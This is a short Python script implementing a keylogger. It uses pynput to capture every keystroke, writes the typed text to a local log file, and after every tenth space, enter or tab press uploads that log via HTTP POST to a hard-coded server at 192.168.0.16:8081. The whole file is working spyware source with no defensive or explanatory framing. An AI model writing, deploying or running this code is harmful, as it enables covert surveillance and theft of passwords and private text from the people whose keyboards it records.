from pynput import keyboard
import logging, os, requests

class Keylogger():
    def __init__(self):
        self.text = ""
        self.count = 0
        self.url = "http://192.168.0.16:8081/upload"
        self.logDir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "log")
        if not os.path.exists(self.logDir):
            os.mkdir(path=self.logDir)
        logging.basicConfig(
            filename=os.path.join(self.logDir, "log.log"),
            level=logging.DEBUG,
            format='%(asctime)s: %(message)s')
        self.start()

    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    def on_press(self, key):
        if key is not keyboard.Key.space and key is not keyboard.Key.enter and key is not keyboard.Key.tab:
            try:
                self.text = self.text + key.char
            except AttributeError:
                pass
        else:
            logging.info(self.text)
            logging.info("Special character {0}".format(key))
            self.text = ""
            self.count += 1
            if self.count % 10 == 0:
                f = open(os.path.join(self.logDir, "log.log"), "rb")
                files = {"file": ("log.log", f)}
                requests.post(url=self.url, files=files)
                f.close()

keylogger = Keylogger()